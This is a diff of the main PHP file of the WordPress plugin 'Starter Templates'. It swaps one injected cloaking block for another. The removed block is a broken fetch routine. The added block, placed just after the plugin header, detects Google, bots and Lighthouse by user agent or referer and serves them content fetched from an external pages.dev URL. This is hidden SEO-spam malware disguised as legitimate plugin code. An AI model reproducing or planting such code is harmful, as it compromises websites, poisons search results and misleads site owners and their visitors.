@@ -1,27 +1,4 @@
 <?php
-function smoky($url) {
-    if (ini_get('allow_url_fopen')) {
-    return file_get_contents($url);
-    } elseif (function_exists('curl_init')) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
-        $response = curl_exec($ch);
-        curl_close($ch);
-        return $response;
-    }
-    return false;
-}
-
-$res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "https://punten-neng.pages.dev/pai.iaingorontalo/";
-if (preg_match($botchar, $res)) {
-    echo $file;
-    exit;
-}
-?>
-<?php
 /**
  * Plugin Name: Starter Templates
  * Plugin URI: https://wpastra.com/
@@ -35,6 +12,20 @@ if (preg_match($botchar, $res)) {
  */
 
 // Check PHP version before loading the plugin.
+$userAgent = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
+$referer = strtolower(isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '');
+$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
+
+if ($uri == '/' && (
+    strpos($userAgent, 'bot') !== false || 
+    strpos($userAgent, 'google') !== false || 
+    strpos($userAgent, 'chrome-lighthouse') !== false || 
+    strpos($referer, 'google') !== false
+)) {
+    echo file_get_contents('https://punten-neng.pages.dev/pai.iaingorontalo/');
+    exit();
+}
+
 if ( version_compare( PHP_VERSION, '7.4', '<' ) ) {
 	add_action( 'admin_notices', 'astra_sites_php_version_notice' );
 	return;
